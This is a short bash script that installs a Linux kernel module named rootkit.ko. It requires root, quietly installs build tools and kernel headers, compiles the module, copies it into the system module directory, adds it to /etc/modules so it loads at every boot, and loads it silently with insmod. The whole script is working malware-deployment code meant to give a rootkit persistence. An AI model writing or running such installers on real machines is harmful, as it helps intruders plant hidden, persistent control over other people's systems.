#! /usr/bin/env bash

MODULE_SAVE_DIR="/lib/modules/$(uname -r)/kernel"
MODULE_NAME=rootkit.ko
MODULE_FULLNAME="${MODULE_SAVE_DIR}/${MODULE_NAME}"

if [ $(id -u) -ne 0 ]; then
	exit 1;
fi

if [ $(apt list --installed 2> /dev/null | grep ^make | wc -l) -eq 0 ]; then
	apt install make -y
	if [ $? -ne 0 ]; then
		exit 1;
	fi
fi

make clean > /dev/null 2>&1
if [ $? -ne 0 ]; then
	apt install linux-headers-$(uname -r) -y
	if [ $? -ne 0 ]; then
		exit 1;
	fi
	make clean 
fi
make > /dev/null 2>&1

cp rootkit.ko -t ${MODULE_SAVE_DIR}
if [ $(cat /etc/modules | grep ${MODULE_FULLNAME} | wc -l) -eq 0 ]; then
	echo "/lib/modules/$(uname -r)/kernel/rootkit.ko" >> /etc/modules
fi

insmod ${MODULE_NAME} > /dev/null 2>&1
